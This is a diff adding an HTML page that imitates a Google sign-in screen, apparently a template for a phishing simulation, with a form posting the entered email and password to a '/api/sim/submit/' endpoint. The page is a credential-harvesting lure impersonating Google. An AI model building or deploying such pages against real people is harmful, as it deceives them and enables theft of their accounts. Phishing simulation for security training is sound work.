@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Google Sign In</title>
+<style>
+
+body{
+font-family:Roboto;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+background:#f1f3f4
+}
+
+.card{
+background:white;
+padding:40px;
+width:350px;
+box-shadow:0 2px 8px rgba(0,0,0,.2)
+}
+
+input{
+width:100%;
+padding:10px;
+margin-top:10px
+}
+
+button{
+margin-top:20px;
+background:#1a73e8;
+color:white;
+padding:10px;
+border:none;
+width:100%
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<h2>Google</h2>
+
+<form method="POST" action="/api/sim/submit/TOKEN_PLACEHOLDER">
+
+<input name="email" placeholder="Email">
+
+<input name="password" type="password" placeholder="Password">
+
+<button>Next</button>
+
+</form>
+
+</div>
+
+</body>
+
+</html>
